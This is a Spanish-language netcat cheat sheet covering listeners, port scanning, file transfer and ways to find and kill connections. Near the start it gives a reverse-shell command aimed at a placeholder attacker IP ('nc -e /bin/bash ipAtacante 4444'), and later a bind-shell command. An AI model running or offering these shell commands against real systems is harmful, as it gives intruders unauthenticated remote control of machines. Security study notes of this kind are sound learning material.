

---

Netcat (nc) es una herramienta de red ligera y versátil que permite leer y escribir datos a través de conexiones TCP o UDP. Se usa para depuración, transferencia de archivos, creación de listeners (escuchas), tunneling simple, banner grabbing y escaneo de puertos. Es muy potente (y también puede usarse con fines maliciosos), por lo que debe emplearse con responsabilidad y permisos adecuados.

- Comando mas usado :

```bash
nc -nlvp 4444
```


- Enviar una reverse shell a tu IP atacante para ejecutar la inyección de código, como en el siguiente ejemplo:

```bash
nc -e /bin/bash ipAtacante 4444
```


---

Otros Comandos/flags más usados (con ejemplos):

- `nc <host> <port>` — Conectar a un servicio TCP.  
    Ejemplo: `nc ejemplo.com 80`
    
- `nc -l -p <port>` — Abrir un puerto en modo escucha (server).  
    Ejemplo: `nc -l -p 1234`
    
- `nc -l -p <port> -k` — Escuchar y aceptar múltiples conexiones (mantener abierto).  
    Ejemplo: `nc -l -p 1234 -k`
    
- `nc -u <host> <port>` — Usar UDP en lugar de TCP.  
    Ejemplo: `nc -u 192.168.1.5 53`
    
- `nc -v` / `-vv` — Modo verbose (más información).  
    Ejemplo: `nc -v ejemplo.com 22`
    
- `nc -n` — No resolver DNS (usar direcciones numéricas).  
    Ejemplo: `nc -n 10.0.0.1 22`
    
- `nc -z -v <host> <ports>` — Escaneo rápido de puertos (modo “zero-I/O”).  
    Ejemplo: `nc -z -v 10.0.0.1 20-80`
    
- `nc -w <seconds>` — Timeout para conexiones o lectura.  
    Ejemplo: `nc -w 3 ejemplo.com 80`
    
- Transferir archivos (sender/receiver):  
    Receptor: `nc -l -p 1234 > archivo_recibido`  
    Emisor: `nc <ip_receptor> 1234 < archivo_a_enviar`
    
- Ejecutar un shell remoto (opción peligrosa y a menudo deshabilitada): `nc -l -p 4444 -e /bin/bash` — **Advertencia:** esto abre un shell remoto sin autenticación; puede comprometer el equipo y muchas distros deshabilitan `-e`.

---

### Ver conexiones (TCP/UDP) y procesos asociados

- Lista conexiones TCP y el PID/Programa:  
    `sudo ss -tnp`  
    (ó `sudo netstat -tnp` si lo tienes)
    
- Lista conexiones UDP:  
    `sudo ss -unp`
    
- Ver quién escucha en un puerto específico (ej. 1234):  
    `sudo ss -tulpn | grep :1234`
    
- Ver procesos que usan puertos (más legible):  
    `sudo lsof -iTCP -P -n | grep LISTEN`  
    o para puerto concreto: `sudo lsof -i :1234`
    
- Buscar procesos `nc` directamente:  
    `ps aux | grep '[n]c'`
    

### Cerrar / eliminar conexiones (formas seguras)

- Matar el proceso por PID (más controlado):
    
    1. Buscar PID con `sudo ss -tnp` o `sudo lsof -i :1234`.
        
    2. Matar: `sudo kill <PID>`
        
    3. Si no responde: `sudo kill -9 <PID>` (usar con precaución).
        
- Matar todos los procesos `nc` (si estás seguro):  
    `sudo pkill -f '\bnc\b'`  
    (esto cierra todos los `nc` en ejecución)
    
- Liberar un puerto directamente:  
    `sudo fuser -k 1234/tcp`  
    (mata procesos que usan el puerto 1234)
    

### Nota de seguridad

- Preferible identificar el PID y usar `kill` antes que `pkill -f` para evitar matar procesos no deseados.
    
- Ejecuta estos comandos con permisos adecuados (`sudo`) y sólo en máquinas donde tengas autorización.